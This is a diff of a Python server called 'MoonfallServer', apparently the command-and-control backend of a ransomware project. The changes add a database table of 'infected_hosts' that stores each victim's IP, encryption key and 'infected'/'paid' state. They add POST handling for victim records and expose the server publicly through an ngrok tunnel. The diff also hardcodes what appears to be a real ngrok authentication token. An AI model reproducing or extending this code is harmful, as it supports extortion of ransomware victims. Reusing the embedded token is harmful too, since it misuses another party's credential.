@@ -1,9 +1,21 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pyngrok import ngrok, conf
-import logging, sqlite3, json
+import sqlite3
+import json
 
-conf.get_default().auth_token = "<NGROK_AUTH_TOKEN"  #change this here, loggin to https://dashboard.ngrok.com/ and get your key.
+conf.get_default().auth_token = "1sZD68OeJd5hYhK5AXcZqadcfhH_78CE8wUxdYd14BULf6CJd"
 
+"""
+We must provide a JSON as the one it follows:
+
+{
+    'operation': 'insert'/'update'
+    'ip': ip_direction,
+    'key': encoded_key,
+    'date': datetime,
+    'state': 'infected'/'paid'
+}
+"""
 class DatabaseManager():
     def __init__(self, db_name="database.db"):
         self.db_name = db_name
@@ -15,7 +27,8 @@ class DatabaseManager():
             print("Successful connection to {}".format(self.db_name))
 
             self.query_executor = self.conn.cursor()
-            #self.query_executor.execute("""create table if not exists infected_hosts(id integer, key text NOT NULL, date text, decrypted text);""")
+            self.query_executor.execute(
+                """create table if not exists infected_hosts(ip text primary key, key text not null, date text not null, state text);""")
         except sqlite3.Error as e:
             print(e)
             raise Exception("Connection failed!")
@@ -34,6 +47,8 @@ class DatabaseManager():
         try:
             self.query_executor.execute(query, data)
             self.conn.commit()
+
+            print("Successful query!")
         except sqlite3.Error as e:
             print(e)
             raise Exception("Query failed!")
@@ -46,10 +61,8 @@ class MoonfallServer(BaseHTTPRequestHandler):
         self.end_headers()
 
     def do_GET(self):
-        # logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
         self._set_response()
-        self.wfile.write("GET request for {}".format(
-            self.path).encode('utf-8'))
+        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))
 
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
@@ -58,31 +71,36 @@ class MoonfallServer(BaseHTTPRequestHandler):
         decoder = json.JSONDecoder()
         jsondata = decoder.decode(post_data.decode('utf-8'))
 
-        # logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(self.path), str(self.headers), post_data.decode('utf-8'))
         self._set_response()
-        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
-        
-        # falta realizar la query a la db mediante el atributo database_manager
+        self.wfile.write("POST request for {}".format(
+            self.path).encode('utf-8'))
+
+        operation = jsondata['operation']
         database_manager = DatabaseManager()
-        database_manager.execute_query('''insert into tbl1(one, two) values(?,?);''', ("HOLA HOLITA", 7))
+
+        # do not check if some registries exists
+        if operation == 'insert':
+            database_manager.execute_query('''insert into infected_hosts(ip, key, date, state) values(?,?,?,?);''', (jsondata['ip'], jsondata['key'], jsondata['date'], jsondata['state']))
+        elif operation == 'update':
+            database_manager.execute_query('''update infected_hosts set state=? where ip=?''',(jsondata['state'], jsondata['ip']))
+        else:
+            print("Incorrect operation")
 
 
 def run(server_class=HTTPServer, handler_class=MoonfallServer, address="localhost", port=8080):
     try:
-        # logging.basicConfig(level=logging.INFO)
-
         server_address = (address, port)
         httpd = server_class(server_address, handler_class)
-        print("Server started http://%s:%s" % (address, port))
+        # print("Server started http://%s:%s" % (address, port))
 
-        # url = ngrok.connect(port)
-        # logging.info('Starting httpd on {url}...\n')
+        url = ngrok.connect(port)
+        print("Server started on {}".format(url))
 
         httpd.serve_forever()
-        # ngrok_tunnel = ngrok.connect()
+        ngrok_tunnel = ngrok.connect()
     except KeyboardInterrupt:
-        httpd.server_close()
-        # logging.info('Stopping httpd...\n')
+        httpd.__exit__()
+        print("Server connection closed")
         exit()
 
 
